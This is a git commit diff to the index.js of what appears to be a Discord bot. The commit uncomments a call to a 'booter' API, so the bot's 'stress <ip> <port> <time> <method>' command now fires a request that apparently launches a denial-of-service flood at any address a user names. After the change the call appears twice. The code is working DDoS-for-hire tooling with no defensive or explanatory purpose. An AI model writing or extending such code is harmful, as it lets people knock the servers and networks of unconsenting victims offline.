c1d813e8385dbce2cc788478aca937a2bafb7fd2
Devious <74839733+DeviousTheDev@users.noreply.github.com>
2021-01-30 21:45:00 -0500

    Update index.js

--- index.js
+++ index.js
@@ -113,11 +113,11 @@ client.on('message', async (message) => {
           if(message.content.split(" ").length < 4) {
             sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time> <method>");
           } else {
-            // fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
-            //   let resp = body;
-            //   console.log(body);
-            //   bootembed(ip, port, time, method, "True", extra.currentTime());
-            // });
+            fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+              let resp = body;
+              console.log(body);
+              bootembed(ip, port, time, method, "True", extra.currentTime());
+            });
             fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
               let resp = body;
               console.log(body);
